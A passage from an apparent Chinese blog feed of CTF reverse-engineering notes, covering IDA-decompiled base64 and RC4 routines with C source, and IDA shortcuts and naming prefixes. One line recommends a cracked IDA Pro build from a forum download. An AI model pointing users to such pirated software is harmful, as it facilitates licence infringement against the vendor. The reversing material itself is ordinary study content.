[rsp+2Ch] [rbp-44h]  </span>    <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-40h]  </span>    <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]  </span>        v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// a1为输入的字符串  </span>    v14 <span class="token operator">=</span> v1 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>   <span class="token comment">// v14为输入字符串长度除3以后的余数  </span>    v13 <span class="token operator">=</span> v1 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span>   <span class="token comment">// v13为3个一组的字符组合数量  </span>    <span class="token function">memset</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v8 <span class="token operator">&lt;</span> v13 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v2 <span class="token operator">=</span> v10<span class="token punctuation">;</span>        v11 <span class="token operator">=</span> v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 第一个：a1[0]右移2位，取前6位作为索引值，查找对应字符</span>        src<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v3 <span class="token operator">=</span> v11<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment">// 第二个：a1[0]取后2位与a1[1]的前4位拼接    </span>        src<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// 第三个：a1[1]取后4位与a1[2]的前2位拼接，查找对应字符    </span>        src<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          v4 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            v10 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token comment">// 第四个：a1[2]取后6位作为索引，查找对应字符  </span>        src<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v9 <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token operator">++</span>v8<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token comment">// 余数为1，则需要添加两个等号    </span>        src<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">strcat</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">"=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>   <span class="token comment">// 余数为2，则需要添加1个等号      </span>        v5 <span class="token operator">=</span> v10<span class="token punctuation">;</span>            v12 <span class="token operator">=</span> v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v6 <span class="token operator">=</span> v12<span class="token operator">++</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v12<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'='</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><blockquote><p>RC4 是对称加密算法，通过密钥 key 和 S盒生成密钥流，明文逐字节异或 S盒，同时 S盒也会发生改变<br>加密与解密使用了相同的函数和密钥 K，加密的强度主要来源于密钥的安全性，密钥泄露能直接解密出明文</p><p><mark>【相关 Writeup 见 攻防世界-crypt、攻防世界-ereere】</mark></p></blockquote><hr><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>RC4 加密算法属于流加密算法，包括<strong>初始化函数</strong>和<strong>加解密函数</strong></li><li><strong>初始化函数</strong>中有两个 256循环，第一个循环给 s 盒初始化为 0 - 255，第二个循环根据密钥 key 对 s 盒 swap</li><li><strong>加解密函数</strong>中有一个 256循环，使明文和 s 盒异或生成密文</li></ol><hr><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><h4 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h4><ul><li>初始化长度为 256 的 S 盒。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒；第二个 for 循环根据密钥 key 打乱 S 盒，i 确保 S-box 的每个元素都得到处理，j 保证 S-box 的搅乱是随机的</li><li>不同的 S-box 在经过伪随机子密码生成算法的处理后可以得到不同的子密钥序列，将 S-box 和明文进行 xor 运算，得到密文，解密过程也完全相同<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//临时向量 k</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Len = strlen(key)，密钥的长度</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//打乱s表</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h4 id="加解密部分"><a href="#加解密部分" class="headerlink" title="加解密部分"></a>加解密部分</h4><ul><li>每收到一个字节，就进行循环。通过一定的算法定位 S 盒中的一个元素，并与输入字节异或，得到 k；同时，循环中还改变了 S 盒</li><li>如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token comment">//Len = strlen(key)，密钥的长度</span>    <span class="token punctuation">&#123;</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><hr><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><pre class="language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">rc4_init</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>  _DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token comment">//循环给 s 盒赋值</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token comment">//循环根据密钥 key 对 s 盒进行 swap</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//Ⅰ、Ⅱ、Ⅲ 交换v9[j]和v9[v7]的值</span>    v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅰ</span>    v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">+</span> v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅱ</span>    v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    <span class="token comment">//Ⅲ</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v6 <span class="token operator">>=</span> a3 <span class="token punctuation">)</span>      v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>_DWORD <span class="token operator">*</span>__fastcall <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>  _DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>  v5 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a3<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//Ⅰ、Ⅱ、Ⅲ、Ⅳ 交换v9[v5]和v9[v6]的值</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅰ</span>    v7 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅱ</span>    v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    <span class="token comment">//Ⅲ</span>    v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token comment">//Ⅳ</span>    <span class="token operator">*</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> v5<span class="token punctuation">;</span>  result <span class="token operator">=</span> a1<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA的基础和使用</title>
      <link href="/2023/03b9f1f74e.html"/>
      <url>/2023/03b9f1f74e.html</url>
      
        <content type="html"><![CDATA[<h2 id="IDA-的下载安装"><a href="#IDA-的下载安装" class="headerlink" title="IDA 的下载安装"></a>IDA 的下载安装</h2><blockquote><p>建议使用<a href="https://www.52pojie.cn/">吾爱破解论坛</a>提供的 IDA Pro版本（<strong>有能力请务必<a href="https://hex-rays.com/IDA-pro/">支持正版</a>，这里仅供讨论学习使用</strong>）</p></blockquote><ul><li>下载：<a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a></li></ul><hr><h2 id="IDA-的常用快捷键"><a href="#IDA-的常用快捷键" class="headerlink" title="IDA 的常用快捷键"></a>IDA 的常用快捷键</h2><table><thead><tr><th>作用</th><th>快捷键</th></tr></thead><tbody><tr><td><strong>查看字符串</strong></td><td>Shift + F12</td></tr><tr><td><strong>反汇编</strong></td><td>F5</td></tr><tr><td><strong>快速查看16进制数的ASCii码对应的字符</strong></td><td>r</td></tr><tr><td><strong>在反汇编后的界面中写下注释</strong></td><td>；</td></tr><tr><td><strong>在反编译后伪代码的界面中写下注释</strong></td><td>&#x2F;</td></tr><tr><td><strong>查看、隐藏变量的类型</strong></td><td>\</td></tr><tr><td><strong>对着某个函数、变量按该快捷键，查看它的交叉引用</strong></td><td>x</td></tr><tr><td><strong>直接跳转到某个地址</strong></td><td>g</td></tr><tr><td><strong>更改变量的名称</strong></td><td>n</td></tr><tr><td><strong>拍摄IDA快照</strong></td><td>ctrl + shift + w</td></tr><tr><td><strong>嵌入脚本</strong></td><td>shift + F2</td></tr><tr><td><strong>文本搜索字符串</strong></td><td>alt + t</td></tr><tr><td><strong>将数据转换为16 进制</strong></td><td>h</td></tr><tr><td><strong>获取数组的数据</strong></td><td>shift + e</td></tr><tr><td><strong>对数据db&#x2F;dw&#x2F;dd之间进行切换</strong></td><td>d</td></tr><tr><td><strong>转化为函数</strong></td><td>p</td></tr><tr><td><strong>将数据转化为代码</strong></td><td>c</td></tr><tr><td><strong>将数据转化为字符串</strong></td><td>a</td></tr><tr><td><strong>将代码转换为数据</strong></td><td>u</td></tr></tbody></table><hr><h2 id="IDA-命名前缀的含义"><a href="#IDA-命名前缀的含义" class="headerlink" title="IDA 命名前缀的含义"></a>IDA 命名前缀的含义</h2><blockquote><p>IDA 会自动生成假名字，用于表示子函数、程序地址和数据，根据不同的类型和值，假名字有不同的前缀</p></blockquote><hr><table><thead><tr><th>前缀</th><th>意义</th></tr></thead><tbody><tr><td><strong>sub_</strong></td><td>指令和子函数起点</td></tr><tr><td>locret_</td><td>返回指令</td></tr><tr><td><strong>loc_</strong></td><td>指令</td></tr><tr><td><strong>off_</strong></td><td>数据，包含偏移量</td></tr><tr><td><strong>seg_</strong></td><td>数据，包含段地址值</td></tr><tr><td>asc_</td><td>数据，ASCII字符串</td></tr><tr><td><strong>byte_</strong></td><td>数据，字节（或字节数组）</td></tr><tr><td><strong>word_</strong></td><td>数据，16位数据（或字数组）</td></tr><tr><td><strong>dword_</strong></td><td>数据，32位数据（或双字数组）</td></tr><tr><td><strong>qword_</strong></td><td>数据，64位数据（或4字数组）</td></tr><tr><td>flt_</td><td>浮点数据，32位（或浮点数组）</td></tr><tr><td>dbl_</td><td>浮点数，64位（或双精度数组）</td></tr><tr><td>tbyte_</td><td>浮点数，80位（或扩展精度浮点数）</td></tr><tr><td>stru_</td><td>结构体(或结构体数组)</td></tr><tr><td>algn_</td><td>对齐指示</td></tr><tr><td><strong>unk_</strong></td><td>未处理字节</td></tr></tbody></table><hr><h2 id="IDA-中的汇编基础"><a href="#IDA-中的汇编基础" class="headerlink" title="IDA 中的汇编基础"></a>IDA 中的汇编基础</h2><h3 id="在字符串最后，用-“0”-表示结束"><a href="#在字符串最后，用-“0”-表示结束" class="headerlink" title="在字符串最后，用 “0” 表示结束"></a>在字符串最后，用 “0” 表示结束</h3><ul><li><strong>Format 的内容：”Welcome The System\nPlease Input Key:”</strong><pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402100</span> <span class="token number">57</span> <span class="token number">65</span> <span class="token number">6</span>C <span class="token number">63</span> <span class="token number">6F</span> <span class="token number">6</span>D <span class="token number">65</span> <span class="token number">20</span> <span class="token number">54</span> <span class="token number">68</span><span class="token operator">+</span> Format db <span class="token char">'Welcome The System'</span> <span class="token punctuation">,</span> <span class="token number">0</span>Ah <span class="token punctuation">;</span>     DATA XREF<span class="token operator">:</span> _main<span class="token operator">+</span><span class="token number">28</span>↑o<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402100</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">53</span> <span class="token number">79</span> <span class="token number">73</span> <span class="token number">74</span> <span class="token number">65</span> <span class="token number">6</span>D <span class="token number">0</span>A <span class="token number">50</span><span class="token operator">+</span> db <span class="token char">'Please Input Key:'</span> <span class="token punctuation">,</span> <span class="token number">0</span></code></pre></li><li><strong>byte_402150 的内容：<code>2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6</code><br>byte_402151 的内容：<code>a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6</code></strong><pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402150</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> byte_402150<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402150</span> <span class="token number">32</span> byte_402150 db <span class="token char">'2'</span> <span class="token punctuation">;</span>      DATA XREF<span class="token operator">:</span> sub_401090<span class="token operator">:</span>loc_4010CC↑r<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402151</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> byte_402151<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402151</span> <span class="token number">61</span> byte_402151 db <span class="token char">'a'</span> <span class="token punctuation">;</span>      DATA XREF<span class="token operator">:</span> sub_401090<span class="token 